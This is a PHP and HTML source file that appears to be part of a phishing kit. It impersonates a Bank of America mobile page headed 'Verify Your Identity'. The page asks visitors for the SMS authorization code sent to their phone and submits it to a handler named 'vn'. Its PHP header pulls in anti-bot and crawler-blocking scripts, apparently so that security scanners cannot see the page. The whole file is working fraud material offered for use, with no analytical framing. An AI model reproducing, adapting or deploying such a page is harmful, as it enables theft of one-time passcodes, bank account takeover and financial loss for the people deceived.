<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>Bank of America | Contact Update</title>
    <link rel="shortcut icon" href="../bstyles/favicon.ico?ts=20151018" type="image/x-icon">
					<link rel="stylesheet" type="text/css" href="../bstyles/vipaa-v4-jawr.css" media="all">
					<link rel="stylesheet" type="text/css" href="../bstyles/vipaa-v4-jawr-print.css" media="print">
					
					
	<link rel="stylesheet" href="../bstyles/bactouch.css"><link rel="stylesheet" href="../bstyles/toolbar.css"><link rel="stylesheet" href="../bstyles/bact_listview.css"><link rel="stylesheet" href="../bstyles/footer.css"><link rel="stylesheet" href="../bstyles/slidemenu.css">
	<style>
	.signonVersionTwoHomePage{max-width:400px;margin:auto;}
	.fsd-secure-esp-skin {
    padding: 20px 0 20px 20px;
	;}
	.new{margin: 9px 9px;}
	.news{margin: 0px 9px;}
	.fl-lt {float: left;}
	.hhh{font-weight:450;font-size:18px;}
	.sss{font-weight:normal;font-size:13px;}

a {color: #36C;text-decoration: none;}
	
	</style>
	</head>

	<body>
	<div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
	<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="../bstyles/BofA_rgb.png">
      <div class="clearboth"></div>
   </div>
</div>
<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Verify Your Identity</div><span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight">
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">

	<div id="accountLocked" class="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'hidden';}?>">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="../bstyles/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError">Error</p>
				<p class="subVal padding10" id="bodyError">The Code you entered was invalid. Try again...</p>
			</li>
		</ul>
	</div>
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset><h2 class="new hhh">Enter Authorization Code.</h2><br/>
			<div class="new sss">An authorization code has been sent to your phone</div><br/>
			<div></div><br/>
				<div class="inputEntryContainer"><form action="vn" id="frmCustomOnlineId" method="post">
					
					<label class="news">Authorization Code</label>
					<div class="inputContainer">
						<input type="text" class="focus sprite-clear_input_icns" name="cod" maxlength="" placeholder="XXXXXX" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
						<input type="hidden" name="ott" value="<?php echo md5(uniqid());?>">
					</div>
					
					<div class="new sss"S>This code expires 10 minutes after it is requested.</div>
					<div style="margin: 9px 15px;">
					&nbsp;
	</div>
	
					<a class="fl-lt forgot-passcode new" name="forgot-your-passcode">Request another authorization code</a>
	
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	</div>
	<div>	
		<a id="btSignonContinue" href="javascript:void(0);" onclick="frmCustomOnlineId.submit();" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="../bstyles/secure_lock.png">
			<span id="signonLabel">Next</span>
		</a>
	</div>
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center"></div>
		<div class="padding10"></div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; height: auto;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>

</div></div>
	<div>
	
	</div>	
</body></html>